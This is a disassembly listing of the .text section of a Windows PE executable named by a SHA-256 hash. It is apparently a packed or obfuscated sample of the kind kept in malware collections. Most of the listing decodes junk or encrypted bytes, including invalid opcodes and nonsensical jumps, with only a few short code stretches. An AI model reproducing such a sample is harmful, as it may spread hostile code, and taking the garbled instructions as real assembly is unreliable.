
91eea4c625e9235472156d8ea4c4d152b7e458a7a39ce021f041aa56b3f1f9e0.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc98
  40100b:	jmp    0x4011ce
  401010:	inc    DWORD PTR ss:[esi]
  401013:	shl    BYTE PTR [edi-0x1ca60faf],1
  401019:	fs cmp eax,0xa415d28c
  40101f:	adc    bh,BYTE PTR [esi+0x7e]
  401022:	jle    0x4010a2
  401024:	cwde   
  401025:	jg     0x4010a5
  401027:	jle    0x400ff7
  401029:	xlat   BYTE PTR ds:[ebx]
  40102a:	cmp    eax,0xcfd339d5
  40102f:	rol    eax,1
  401031:	pop    es
  401032:	add    al,0x3
  401034:	push   cs
  401035:	nop
  401036:	add    BYTE PTR [edi],cl
  401038:	xor    ecx,DWORD PTR [edi]
  40103a:	rcr    BYTE PTR [eax],0xc7
  40103d:	adc    BYTE PTR [edi],bl
  40103f:	mov    ecx,0xddb70058
  401044:	push   cs
  401045:	out    dx,eax
  401046:	mov    ebp,0x8e03d6db
  40104b:	es mov esi,0x1541a2f4
  401051:	lods   eax,DWORD PTR ds:[esi]
  401052:	fiadd  WORD PTR [esi+0x1f]
  401055:	data16 in al,dx
  401057:	outs   dx,DWORD PTR ds:[esi]
  401058:	or     edx,DWORD PTR [ecx]
  40105a:	pushf  
  40105b:	js     0x401033
  40105d:	inc    eax
  40105e:	stos   BYTE PTR es:[edi],al
  40105f:	push   ebx
  401060:	sub    eax,0xad3cc4d1
  401065:	mov    bh,BYTE PTR [ebx-0x3b]
  401068:	stos   DWORD PTR es:[edi],eax
  401069:	push   es
  40106a:	(bad)  
  40106b:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401071:	jmp    0x4010a3
  401073:	mov    ebp,ecx
  401075:	dec    edi
  401076:	out    0xa6,al
  401078:	inc    ecx
  401079:	call   DWORD PTR [edi-0x2556f868]
  40107f:	mov    ebp,0x5536ed4d
  401084:	and    esi,DWORD PTR [edx-0x43619116]
  40108a:	jnp    0x40109d
  40108c:	ret    
  40108d:	xchg   edx,eax
  40108e:	and    esp,edx
  401090:	jmp    0x4010f0
  401092:	ret    0xb8e4
  401095:	lock jmp 0xd765:0x74cf3192
  40109d:	and    ch,cl
  40109f:	add    bl,cl
  4010a1:	adc    DWORD PTR [ecx-0x5a],edx
  4010a4:	xor    eax,0x78616f03
  4010a9:	or     BYTE PTR [ecx],dh
  4010ab:	fisttp QWORD PTR [esi+0x7f752854]
  4010b1:	(bad)
  4010b6:	or     ebx,DWORD PTR [ebx+0x55]
  4010b9:	fst    st(6)
  4010bb:	or     ebx,edx
  4010bd:	pop    esp
  4010be:	fstp   DWORD PTR [ecx]
  4010c0:	jno    0x401060
  4010c2:	inc    esi
  4010c3:	dec    ebx
  4010c4:	aaa    
  4010c5:	adc    eax,0x1a29772b
  4010ca:	sar    DWORD PTR [esi],cl
  4010cc:	dec    edi
  4010cd:	call   0xcdaab59f
  4010d2:	mov    cl,0x1e
  4010d4:	pop    eax
  4010d5:	inc    ebp
  4010d6:	mov    edi,0xa219a3a5
  4010db:	mov    edi,0x7ff5363c
  4010e0:	mov    edx,0x875eba33
  4010e5:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4010e7:	daa    
  4010e8:	adc    DWORD PTR [eax],0xfffffff0
  4010eb:	pop    esp
  4010ec:	inc    esp
  4010ed:	test   eax,0xb5c570a4
  4010f2:	iret   
  4010f3:	fimul  DWORD PTR [esi]
  4010f5:	mov    dl,0xce
  4010f7:	leavew 
  4010f9:	aad    0x7f
  4010fb:	mov    ebx,0xe699193e
  401100:	inc    esi
  401101:	cmp    BYTE PTR [edi-0x5d4e8b13],0x29
  401108:	jb     0x4010d5
  40110a:	push   ss
  40110b:	gs inc eax
  40110d:	sbb    eax,0xdeb9c69b
  401112:	cmp    DWORD PTR [esi-0x5b312238],0xa48c796b
  40111c:	bound  esp,QWORD PTR [ebx-0x19]
  40111f:	sub    eax,0x98cbe64a
  401124:	dec    ebx
  401125:	scas   eax,DWORD PTR es:[edi]
  401126:	lock lock out 0x45,eax
  40112a:	stc    
  40112b:	or     al,0xce
  40112d:	dec    esi
  40112e:	nop
  40112f:	xor    al,0xfa
  401131:	pop    ss
  401132:	inc    ebp
  401133:	adc    DWORD PTR [eax-0x2a45e136],edi
  401139:	dec    esi
  40113a:	jge    0x4010ec
  40113c:	push   ss
  40113d:	scas   eax,DWORD PTR es:[edi]
  40113e:	retf   0x6207
  401141:	mov    ch,0x5b
  401143:	aaa    
  401144:	mov    ss,WORD PTR [esi]
  401146:	repnz dec edi
  401148:	pop    ebp
  401149:	fs mov ecx,0x23bbbb47
  40114f:	dec    ecx
  401150:	jne    0x4011a9
  401152:	add    ecx,DWORD PTR [ecx+edx*2+0x1f4099ba]
  401159:	pshufw mm0,QWORD PTR [ecx],0x90
  40115d:	pop    ss
  40115e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40115f:	or     al,0x12
  401161:	inc    esp
  401162:	push   esp
  401163:	or     esp,ebx
  401165:	mov    esp,gs
  401167:	icebp  
  401168:	bound  edx,QWORD PTR [esi-0x2a]
  40116b:	cdq    
  40116c:	adc    edx,DWORD PTR [edx]
  40116e:	inc    ebx
  40116f:	iret   
  401170:	mov    BYTE PTR [ebx+0x10712dab],dl
  401176:	sub    BYTE PTR [edi+ebx*4+0xc],bl
  40117a:	jg     0x40117b
  40117c:	jne    0x40114a
  40117e:	jg     0x401182
  401180:	sub    eax,0xb252937c
  401185:	mov    BYTE PTR [ecx],ch
  401187:	(bad)  
  401188:	dec    eax
  401189:	cdq    
  40118a:	cmp    BYTE PTR ds:0xb3a26db5,dh
  401190:	push   edi
  401191:	dec    esi
  401192:	out    0xbf,eax
  401194:	ja     0x401176
  401196:	lock inc ecx
  401198:	idiv   BYTE PTR [edi]
  40119a:	(bad)  
  40119b:	jl     0x4011ed
  40119d:	loope  0x40119e
  40119f:	cmp    eax,DWORD PTR [edx]
  4011a1:	cld    
  4011a2:	mov    edx,0x75504900
  4011a7:	push   DWORD PTR [eax+0x3550cd8a]
  4011ad:	test   ch,dl
  4011af:	std    
  4011b0:	mov    esi,0xa0af4ba7
  4011b5:	or     esi,DWORD PTR [ebp+0x722dd76b]
  4011bb:	xchg   DWORD PTR [edx+ebx*1+0x57a8f210],esi
  4011c2:	sub    dh,BYTE PTR [edx-0x6b]
  4011c5:	jno    0x401246
  4011c7:	sub    al,0x8f
  4011c9:	scas   eax,DWORD PTR es:[edi]
  4011ca:	je     0x4011f0
  4011cc:	sbb    ah,BYTE PTR [edi-0x461fba77]
  4011d2:	cmp    bl,BYTE PTR [ebp+0x0]
  4011d5:	add    BYTE PTR [ebx+0x45c7e04d],cl
  4011db:	fadd   st(1),st
  4011dd:	dec    esi
  4011de:	add    BYTE PTR [eax],al
  4011e0:	cmp    ecx,eax
  4011e2:	jne    0x4020c2
  4011e8:	sbb    ecx,0xfa8
  4011ee:	mov    ax,WORD PTR [ebp-0x24]
  4011f2:	and    DWORD PTR ds:0x430455,0x0
  4011fc:	mov    ecx,DWORD PTR ds:0x430455
  401202:	inc    ecx
  401203:	mov    DWORD PTR ds:0x430455,ecx
  401209:	cmp    DWORD PTR ds:0x430455,0xb
  401210:	jne    0x401248
  401216:	push   0x25a9
  40121b:	push   0x3372
  401220:	push   0x5bb7
  401225:	push   DWORD PTR [ebp-0x1c]
  401228:	push   0x6ec1
  40122d:	push   DWORD PTR [ebp-0x28]
  401230:	push   0x3d62
  401235:	push   0x5689
  40123a:	push   DWORD PTR [ebp-0x28]
  40123d:	push   0x7975
  401242:	call   DWORD PTR ds:0x42ec0b
  401248:	cmp    DWORD PTR ds:0x430455,0xa
  40124f:	jne    0x401262
  401255:	mov    ecx,DWORD PTR ds:0x430455
  40125b:	inc    ecx
  40125c:	mov    DWORD PTR ds:0x430455,ecx
  401262:	cmp    DWORD PTR ds:0x430455,0x12
  401269:	jb     0x4011fc
  40126f:	mov    DWORD PTR ds:0x43044d,0x1e
  401279:	cmp    DWORD PTR ds:0x43044d,0x0
  401280:	je     0x401471
  401286:	cmp    DWORD PTR ds:0x43044d,0x2d
  40128d:	jne    0x40129c
  401293:	push   DWORD PTR [ebp-0x20]
  401296:	call   DWORD PTR ds:0x42e9a7
  40129c:	mov    ecx,DWORD PTR ds:0x43044d
  4012a2:	dec    ecx
  4012a3:	mov    DWORD PTR ds:0x43044d,ecx
  4012a9:	jmp    0x401279
  4012ae:	jmp    0x401471
  4012b3:	out    0xe8,al
  4012b5:	sub    al,BYTE PTR [ebx]
  4012b7:	xor    cl,al
  4012b9:	imul   ecx
  4012bb:	and    BYTE PTR [ecx],bh
  4012bd:	adc    esi,DWORD PTR [ebx-0x3c964ab1]
  4012c3:	cwde   
  4012c4:	jg     0x401344
  4012c6:	jle    0x401260
  4012c8:	jg     0x401348
  4012ca:	jle    0x4012c2
  4012cc:	leave  
  4012cd:	dec    ebx
  4012ce:	jecxz  0x4012a0
  4012d0:	sub    edx,DWORD PTR [ecx]
  4012d2:	push   0xa098679a
  4012d7:	lods   al,BYTE PTR ds:[esi]
  4012d8:	sub    al,0xb7
  4012da:	int    0x88
  4012dc:	enter  0x718d,0x26
  4012e0:	mov    ecx,0x55337e64
  4012e5:	in     eax,0xda
  4012e7:	jp     0x4012bf
  4012e9:	mov    edi,0xfa9ebf8
  4012ee:	fmulp  st(0),st
  4012f0:	aam    0x1f
  4012f2:	sbb    DWORD PTR ds:[eax-0x33],0x355fe04c
  4012fa:	cmc    
  4012fb:	mov    ds:0x12932621,al
  401300:	sahf   
  401301:	push   es
  401302:	mov    ebp,0x17cf1e29
  401307:	dec    ebp
  401308:	mov    WORD PTR ds:0x34147795,fs
  40130e:	sub    al,0x60
  401310:	sbb    ecx,DWORD PTR [edi-0x3d]
  401313:	add    al,0x70
  401315:	pusha  
  401316:	pop    esi
  401317:	mov    al,ds:0x9aac2d4f
  40131c:	imul   dl
  40131e:	rol    BYTE PTR [ebx],0xc8
  401321:	mov    bl,0x44
  401323:	xlat   BYTE PTR ds:[ebx]
  401324:	fwait
  401325:	xor    edx,edx
  401327:	dec    edx
  401328:	mov    al,ds:0x24d19d91
  40132d:	iret   
  40132e:	mov    dl,0xda
  401330:	pop    ebp
  401331:	std    
  401332:	add    DWORD PTR [esp+eax*1-0x31],0x78563643
  40133a:	inc    eax
  40133b:	dec    ecx
  40133c:	js     0x401364
  40133e:	adc    eax,0x16de965b
  401343:	call   0xe6ef:0x1b342a92
  40134a:	push   edx
  40134b:	inc    eax
  40134c:	shl    BYTE PTR [ecx+0x7a508225],0x25
  401353:	mov    bh,0xaa
  401355:	pop    ecx
  401356:	mov    dl,0x28
  401358:	mov    DWORD PTR [edi-0x15],ebp
  40135b:	cli    
  40135c:	push   esi
  40135d:	pop    edi
  40135e:	nop
  40135f:	lock aam 0xce
  401362:	(bad)  
  401363:	sbb    al,0xa2
  401365:	ja     0x40130d
  401367:	cmp    DWORD PTR [edi+0x54888605],ebp
  40136d:	pop    edi
  40136e:	fild   WORD PTR [ebx]
  401370:	out    0xce,eax
  401372:	mov    ds:0x2eab2d85,eax
  401377:	popf   
  401378:	imul   esp,edx,0xfa583f33
  40137e:	jb     0x40133a
  401380:	rcr    DWORD PTR [ecx-0x48],0x3b
  401384:	xchg   esp,eax
  401385:	pop    ds
  401386:	xchg   BYTE PTR [eax],dh
  401388:	sbb    BYTE PTR [edi+esi*4+0x774a277d],al
  40138f:	push   0x5a35e84c
  401394:	loop   0x401341
  401396:	rcl    DWORD PTR [ebx],cl
  401398:	xlat   BYTE PTR ds:[ebx]
  401399:	std    
  40139a:	add    esp,DWORD PTR [edi]
  40139c:	push   edi
  40139d:	xchg   ecx,eax
  40139e:	enter  0x5d9,0xe
  4013a2:	sbb    al,0x6b
  4013a4:	pop    ebx
  4013a5:	call   0x4504:0x19b774d5
  4013ac:	retf   0xc6df
  4013af:	add    eax,0x97392f83
  4013b4:	add    eax,0xcd53013b
  4013b9:	stos   BYTE PTR es:[edi],al
  4013ba:	data16 jp 0x401352
  4013bd:	cmp    ecx,DWORD PTR [edi+0x15]
  4013c0:	rol    ah,1
  4013c2:	jnp    0x401407
  4013c4:	and    ecx,DWORD PTR [edx+eiz*8-0x8]
  4013c8:	mov    esi,0x2334a2a2
  4013cd:	fcomip st,st(4)
  4013cf:	sti    
  4013d0:	cwde   
  4013d1:	cmp    dl,BYTE PTR [eax]
  4013d3:	push   edx
  4013d4:	xchg   BYTE PTR [edx-0x26],cl
  4013d7:	sub    DWORD PTR [eax+0x3cfe98ea],edx
  4013dd:	icebp  
  4013de:	loop   0x401420
  4013e0:	ds mul cl
  4013e3:	sub    ah,0x59
  4013e6:	pop    ds
  4013e7:	nop
  4013e8:	mov    BYTE PTR [ecx],bh
  4013ea:	lea    esi,[ecx+0x7b]
  4013ed:	jp     0x4013b9
  4013ef:	cli    
  4013f0:	test   BYTE PTR [ebp-0x672c63de],dh
  4013f6:	aam    0x28
  4013f8:	xor    bh,BYTE PTR [esi-0x50]
  4013fb:	ret    
  4013fc:	mov    cl,BYTE PTR [ecx+ebp*8]
  4013ff:	xchg   ah,bl
  401401:	cmp    cl,BYTE PTR [eax]
  401403:	add    bl,BYTE PTR [eax+eiz*8-0x1f]
  401407:	and    eax,0xf59d8351
  40140c:	jbe    0x4013a1
  40140e:	push   edx
  40140f:	stos   DWORD PTR es:[edi],eax
  401410:	outs   dx,BYTE PTR ds:[esi]
  401411:	aaa    
  401412:	fisubr DWORD PTR [ecx-0x5f30e806]
  401418:	xor    al,0x51
  40141a:	mov    ah,0xd0
  40141c:	mov    esp,0x8ca82d46
  401421:	ret    
  401422:	dec    eax
  401423:	neg    DWORD PTR [ecx+esi*2-0x3f197088]
  40142a:	push   edi
  40142b:	add    DWORD PTR [esi+esi*4],esp
  40142e:	ss out dx,eax
  401430:	rcr    DWORD PTR [eax+esi*2],cl
  401433:	nop
  401434:	mov    dh,0xa4
  401436:	mov    dl,0xad
  401438:	cli    
  401439:	pushf  
  40143a:	sub    esi,DWORD PTR [edi+0x53]
  40143d:	ins    BYTE PTR es:[edi],dx
  40143e:	scas   al,BYTE PTR es:[edi]
  40143f:	cmp    al,0xdf
  401441:	aas    
  401442:	add    edx,DWORD PTR [edx+0x1a]
  401445:	rcr    DWORD PTR [esi-0x38],1
  401448:	inc    esp
  401449:	repz dec edi
  40144b:	dec    edi
  40144c:	pop    ebp
  40144d:	sub    al,0xb9
  40144f:	imul   esi,DWORD PTR [edx+0xaf66509],0xffffff85
  401456:	je     0x4013e9
  401458:	aad    0x20
  40145a:	xor    ebp,eax
  40145c:	fucompp 
  40145e:	cwde   
  40145f:	xchg   esp,eax
  401460:	lea    ecx,[eax-0x6e]
  401463:	push   eax
  401464:	pop    eax
  401465:	mov    ebp,0x9b74f54e
  40146a:	outs   dx,DWORD PTR ds:[esi]
  40146b:	popa   
  40146c:	fsubr  DWORD PTR [ebx+esi*4]
  40146f:	outs   dx,BYTE PTR ds:[esi]
  401470:	dec    edx
  401471:	push   esi
  401472:	mov    ecx,0x8a3c
  401477:	adc    DWORD PTR ds:0x42eddb,0x2f3d
  401481:	xor    ax,cx
  401484:	movzx  esi,WORD PTR ds:0x430439
  40148b:	or     DWORD PTR ds:0x4304eb,esi
  401491:	mov    ecx,DWORD PTR [ebp+0x8]
  401494:	jmp    0x401657
  401499:	adc    eax,0x716ff192
  40149e:	ins    DWORD PTR es:[edi],dx
  40149f:	xchg   ecx,eax
  4014a0:	jo     0x40144d
  4014a2:	or     eax,0xec490fff
  4014a7:	(bad)  [edx]
  4014a9:	ret    0x7e7d
  4014ac:	jle    0x401446
  4014ae:	jg     0x40152e
  4014b0:	jle    0x40147e
  4014b2:	div    BYTE PTR [ebp-0x3f6f08b6]
  4014b8:	mov    dh,0x5c
  4014ba:	sub    BYTE PTR [ebp+0x68b18c70],dl
  4014c0:	into   
  4014c1:	test   BYTE PTR [eax],bh
  4014c3:	rol    DWORD PTR [ecx+0x1586d6f7],1
  4014c9:	rcl    BYTE PTR [edx],0x1c
  4014cc:	daa    
  4014cd:	cs icebp 
  4014cf:	in     al,0xcf
  4014d1:	loopne 0x401546
  4014d3:	shl    BYTE PTR [ebp-0x69],1
  4014d6:	push   ecx
  4014d7:	jns    0x40154f
  4014d9:	push   0xcd6ac986
  4014de:	scas   eax,DWORD PTR es:[edi]
  4014df:	ret    0x6061
  4014e2:	int    0x88
  4014e4:	inc    DWORD PTR [ebp-0x5d]
  4014e7:	shr    DWORD PTR [edi+0x4c],cl
  4014ea:	push   edx
  4014eb:	out    dx,eax
  4014ec:	mov    DWORD PTR ds:0xd2481f2e,esp
  4014f2:	xchg   esi,eax
  4014f3:	cmp    edx,DWORD PTR [edi]
  4014f5:	addr16 pop esi
  4014f7:	ss push ss
  4014f9:	inc    ecx
  4014fa:	push   ecx
  4014fb:	out    dx,al
  4014fc:	xor    BYTE PTR [ebx+0x7d],0xb1
  401500:	cli    
  401501:	aas    
  401502:	add    edi,DWORD PTR [edx]
  401504:	add    eax,0x3925d02
  401509:	add    cl,bh
  40150b:	mov    eax,0x89f59f1d
  401510:	(bad)  
  401511:	adc    ecx,DWORD PTR [eax]
  401513:	sbb    al,0x93
  401515:	sar    BYTE PTR [ebp+0xe5c2cec],cl
  40151b:	xor    edi,ecx
  40151d:	dec    ebx
  40151e:	adc    al,0xb0
  401520:	ins    DWORD PTR es:[edi],dx
  401521:	pop    ecx
  401522:	cwde   
  401523:	pop    ebx
  401524:	sub    dl,BYTE PTR [ebx+esi*2]
  401527:	adc    eax,0x920ae44a
  40152c:	xor    al,0x46
  40152e:	sbb    edi,DWORD PTR [eax]
  401530:	clc    
  401531:	cli    
  401532:	test   esi,eax
  401534:	jp     0x40152e
  401536:	pop    edi
  401537:	cs mov ebp,0xe90eee55
  40153d:	je     0x40154d
  40153f:	pop    ds
  401540:	dec    esp
  401541:	pop    edi
  401542:	jno    0x401567
  401544:	mov    WORD PTR [ebp+0x13],?
  401547:	bound  eax,QWORD PTR [edi+0x76ab64f8]
  40154d:	or     eax,0x9c5289ac
  401552:	loopne 0x4015c4
  401554:	gs hlt 
  401556:	dec    eax
  401557:	xchg   edi,eax
  401558:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401559:	jmp    0xd3db:0x16f53567
  401560:	add    eax,0xa5ce8e9e
  401565:	outs   dx,BYTE PTR ds:[esi]
  401566:	mov    bh,0xc
  401568:	(bad)  
  40156a:	fisttp DWORD PTR gs:[eax+0x53]
  40156e:	mov    cs,WORD PTR [edi+0x7d0d7f1d]
  401574:	or     ebp,ebx
  401576:	sub    eax,0x2f20aa5d
  40157b:	lahf   
  40157c:	repz or DWORD PTR [esi-0x7f],ecx
  401580:	enter  0x82a2,0xf
  401584:	adc    al,0x22
  401586:	leave  
  401587:	cs int3 
  401589:	fistp  WORD PTR [ecx+0x20f7dbde]
  40158f:	ficomp WORD PTR [ecx+0x54]
  401592:	xchg   esi,eax
  401593:	sbb    al,0x95
  401595:	sub    DWORD PTR [eax-0x6],esp
  401598:	and    DWORD PTR [esi+0x1a4efb94],0x38
  40159f:	div    DWORD PTR [esi-0x62672678]
  4015a5:	sub    al,0x5e
  4015a7:	jmp    0x401586
  4015a9:	or     cl,dl
  4015ab:	push   ds
  4015ac:	lock xchg DWORD PTR [ebx+0x5e],ebx
  4015b0:	dec    edx
  4015b1:	xor    esp,DWORD PTR [edi-0x3c]
  4015b4:	cwde   
  4015b5:	jb     0x401548
  4015b7:	mov    bh,dh
  4015b9:	jmp    0x401605
  4015bb:	(bad)  
  4015bc:	mov    dl,0x15
  4015be:	cli    
  4015bf:	xchg   esp,eax
  4015c0:	xchg   BYTE PTR [eax-0x2],dl
  4015c3:	pop    ebp
  4015c4:	sub    ecx,DWORD PTR [ecx+0x25f4f9fe]
  4015ca:	push   eax
  4015cb:	push   esi
  4015cc:	or     bl,BYTE PTR [ebp+0x3fef7d35]
  4015d2:	push   cs
  4015d3:	ins    DWORD PTR es:[edi],dx
  4015d4:	mov    ds:0x611c3bef,al
  4015d9:	test   al,0xfb
  4015db:	mov    edx,ebp
  4015dd:	lds    edi,FWORD PTR [edx-0x6c5d5c22]
  4015e3:	popf   
  4015e4:	xchg   esi,eax
  4015e5:	loopne 0x4015ce
  4015e7:	stc    
  4015e8:	nop
  4015e9:	psrlw  mm7,QWORD PTR [edx+eiz*8-0x69]
  4015ee:	adc    edx,eax
  4015f0:	or     dh,BYTE PTR [esi+0x6e]
  4015f3:	(bad)  
  4015f5:	sub    DWORD PTR [esi-0x21],edi
  4015f8:	scas   eax,DWORD PTR es:[edi]
  4015f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015fa:	ss mov al,0xd9
  4015fd:	add    DWORD PTR [ecx],eax
  4015ff:	call   0xe2c7f3bc
  401604:	pop    eax
  401605:	or     al,BYTE PTR [ebx-0x51]
  401608:	mov    ds:0xf159621c,eax
  40160d:	lds    ecx,FWORD PTR [ecx]
  40160f:	xlat   BYTE PTR ds:[ebx]
  401610:	jge    0x401635
  401612:	xor    BYTE PTR [ebp-0x1a],ch
  401615:	repnz push ss
  401617:	mov    WORD PTR [ebp+0x25],?
  40161a:	in     eax,dx
  40161b:	jns    0x4015f8
  40161d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40161e:	sub    BYTE PTR [ecx+0x66],bl
  401621:	xor    cl,BYTE PTR [ebx-0x10334be6]
  401627:	sar    esp,0xc2
  40162a:	push   ebp
  40162b:	push   ecx
  40162c:	inc    edi
  40162d:	shl    DWORD PTR [edx],1
  40162f:	dec    ecx
  401630:	xchg   DWORD PTR [edi],eax
  401632:	sbb    DWORD PTR [ebx],esi
  401634:	je     0x4015e0
  401636:	scas   eax,DWORD PTR es:[edi]
  401637:	outs   dx,DWORD PTR ds:[esi]
  401638:	xor    DWORD PTR [eax],edx
  40163a:	ret    0x572f
  40163d:	push   0x3f
  40163f:	mov    al,ds:0x68619f4a
  401644:	rcl    DWORD PTR [edx+0x1e],cl
  401647:	je     0x401617
  401649:	mov    cl,0xeb
  40164b:	loopne 0x401667
  40164d:	mov    gs,WORD PTR [ebp-0x625be781]
  401653:	adc    esi,DWORD PTR [ebx+0xc]
  401656:	xchg   esi,eax
  401657:	push   edi
  401658:	and    esi,edi
  40165a:	jmp    0x40181d
  40165f:	push   cs
  401660:	and    BYTE PTR [edi],dh
  401662:	pop    ebp
  401663:	xor    DWORD PTR [ecx+0x54],ebp
  401666:	jno    0x4016b3
  401668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401669:	cmp    BYTE PTR [edi],bl
  40166b:	push   ecx
  40166c:	push   edi
  40166d:	xor    eax,0x7e7a6ca2
  401672:	jle    0x40160c
  401674:	jg     0x4016f4
  401676:	jle    0x4016be
  401678:	dec    ecx
  401679:	mov    es,WORD PTR [ecx-0x2fdfaec7]
  40167f:	(bad)  
  401680:	aad    0x3f
  401682:	mov    al,0x31
  401684:	data16 jbe 0x4016b5
  401687:	popa   
  401688:	pop    ds
  401689:	stos   BYTE PTR es:[edi],al
  40168a:	mov    ebp,0xf945d3d4
  40168f:	or     bl,al
  401691:	lahf   
  401692:	leave  
  401693:	pusha  
  401694:	popa   
  401695:	pushf  
  401696:	dec    ebp
  401697:	ftst   
  401699:	mov    esi,0xd2a070dc
  40169e:	or     DWORD PTR [ebp+0x9d79ca2],ebx
  4016a4:	test   eax,0xe2e33233
  4016a9:	push   edi
  4016aa:	pop    edi
  4016ab:	test   eax,esi
  4016ad:	pop    ecx
  4016ae:	sbb    BYTE PTR [edx-0x68],ch
  4016b1:	test   DWORD PTR [eax],esp
  4016b3:	loopne 0x401658
  4016b5:	repnz or bh,BYTE PTR [ecx+eax*4-0x67]
  4016ba:	ja     0x401688
  4016bc:	inc    ebx
  4016bd:	mov    bl,0xf0
  4016bf:	and    BYTE PTR [edx],0xe5
  4016c2:	gs push 0x53c0d564
  4016c8:	xor    BYTE PTR [ecx],ah
  4016ca:	pushf  
  4016cb:	mov    esi,0x6daf6be
  4016d0:	push   0x56ad2b43
  4016d5:	xor    al,0xf7
  4016d7:	xchg   BYTE PTR [ebx+eax*8],bl
  4016da:	out    dx,eax
  4016db:	imul   esi,edi,0xffffffad
  4016de:	(bad)  
  4016df:	push   ebx
  4016e0:	fisubr DWORD PTR [esi+0x22]
  4016e3:	cld    
  4016e4:	inc    ebp
  4016e5:	dec    ebx
  4016e6:	sbb    ebx,DWORD PTR [ebp-0x33]
  4016e9:	fld    TBYTE PTR [ebx+eax*1]
  4016ec:	cmp    esp,DWORD PTR [eax+ebp*8]
  4016ef:	inc    esp
  4016f0:	lahf   
  4016f1:	ret    
  4016f2:	cmp    esi,ebp
  4016f4:	daa    
  4016f5:	sbb    ah,BYTE PTR [esi]
  4016f7:	jle    0x40173b
  4016f9:	scas   eax,DWORD PTR es:[edi]
  4016fa:	jb     0x4016d7
  4016fc:	dec    esi
  4016fd:	push   es
  4016fe:	and    ecx,eax
  401700:	jecxz  0x40170d
  401702:	jo     0x4016ad
  401704:	call   0x5cadda0b
  401709:	into   
  40170a:	mov    dl,BYTE PTR [ecx+0x6f]
  40170d:	mov    edx,0x4ced20cc
  401712:	std    
  401713:	pop    esi
  401714:	js     0x4016d8
  401716:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401717:	dec    ebp
  401718:	jp     0x401711
  40171a:	xchg   esp,eax
  40171b:	push   esi
  40171c:	sar    eax,1
  40171e:	sbb    cl,BYTE PTR [edi-0x2e]
  401721:	push   ds
  401722:	jae    0x4016cc
  401724:	dec    ebx
  401725:	mov    esi,0xe5bf68e9
  40172a:	das    
  40172b:	jb     0x3bd0199a
  401731:	dec    eax
  401732:	mov    bh,0x7b
  401734:	fst    QWORD PTR [ecx-0x5d]
  401737:	pop    ds
  401738:	push   ecx
  401739:	push   esp
  40173a:	shl    DWORD PTR [ebx+0x75a53ceb],1
  401740:	jp     0x4017a2
  401742:	pop    eax
  401743:	loope  0x401760
  401745:	sub    al,0x1c
  401747:	scas   eax,DWORD PTR es:[edi]
  401748:	add    al,BYTE PTR [edi+0x967acb1]
  40174e:	push   ds
  40174f:	enter  0x8817,0x4e
  401753:	fcmovnbe st,st(3)
  401755:	mov    edi,0x5da6ec82
  40175a:	ret    0x9396
  40175d:	outs   dx,DWORD PTR ds:[esi]
  40175e:	mov    BYTE PTR [eax],cl
  401760:	mov    BYTE PTR [edx],bh
  401762:	les    esi,FWORD PTR [eax-0x75]
  401765:	pop    ds
  401766:	pop    ds
  401767:	lods   al,BYTE PTR ds:[esi]
  401768:	cmp    ebp,edx
  40176a:	inc    edi
  40176b:	push   0x33
  40176d:	and    eax,0x572b4c9f
  401772:	pop    ebx
  401773:	ficom  WORD PTR [edx+ebx*1]
  401776:	xchg   ebp,eax
  401777:	mov    BYTE PTR [edi-0x740e7bff],cl
  40177d:	ss sbb al,0xf9
  401780:	xlat   BYTE PTR ds:[ebx]
  401781:	xchg   ebp,eax
  401782:	inc    esp
  401783:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401784:	and    ah,BYTE PTR [edi]
  401786:	add    DWORD PTR [ecx+0x25],eax
  401789:	add    DWORD PTR [ebp+0x47df3135],0xe18126ec
  401793:	sbb    al,0x94
  401795:	shl    DWORD PTR [ecx+0x3a],0xfe
  401799:	bound  ebp,QWORD PTR [ecx-0x2de5c38c]
  40179f:	test   BYTE PTR [esi+0x6ce10f57],dl
  4017a5:	adc    al,0xc9
  4017a7:	shl    DWORD PTR [eax-0x31],0x31
  4017ab:	out    0x90,al
  4017ad:	cmp    eax,0x918293
  4017b2:	mov    al,ds:0xecc9db93
  4017b7:	inc    edx
  4017b8:	pop    ds
  4017b9:	sbb    BYTE PTR [edi],0xbc
  4017bc:	ret    0x129a
  4017bf:	adc    eax,0x37fbdf2f
  4017c4:	retf   
  4017c5:	cs cdq 
  4017c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017c8:	sar    dl,0x21
  4017cb:	(bad)  
  4017cc:	mov    DWORD PTR [edi],ecx
  4017ce:	push   0xd5213df
  4017d3:	shr    bl,0x3c
  4017d6:	popf   
  4017d7:	ins    DWORD PTR es:[edi],dx
  4017d8:	sbb    eax,0xf69aa61
  4017dd:	sub    DWORD PTR [edi-0x45],0x12
  4017e1:	xchg   esi,eax
  4017e2:	fwait
  4017e3:	add    eax,0xd41b18a3
  4017e8:	xor    esi,DWORD PTR [edx]
  4017ea:	pop    edx
  4017eb:	lahf   
  4017ec:	xchg   esi,eax
  4017ed:	(bad)  
  4017ef:	das    
  4017f0:	xchg   esi,eax
  4017f1:	hlt    
  4017f2:	sar    DWORD PTR [edx],cl
  4017f4:	xchg   esp,eax
  4017f5:	adc    eax,esi
  4017f7:	in     al,dx
  4017f8:	and    al,0xd9
  4017fa:	sub    cl,bh
  4017fc:	cmp    al,cl
  4017fe:	cs gs ins BYTE PTR es:[edi],dx
  401801:	xchg   ecx,eax
  401802:	ret    0x2d45
  401805:	test   al,0xb
  401807:	shl    edi,0x63
  40180a:	xor    DWORD PTR [eax-0x7c55dd21],esp
  401810:	mov    dl,0x39
  401812:	bswap  eax
  401814:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401815:	retf   
  401816:	ficomp DWORD PTR [edi]
  401818:	jnp    0x4017fd
  40181a:	fdiv   st,st(7)
  40181c:	das    
  40181d:	mov    edi,0x3b02
  401822:	add    ax,di
  401825:	mov    DWORD PTR ds:0x430455,0x60d8
  40182f:	movzx  eax,ax
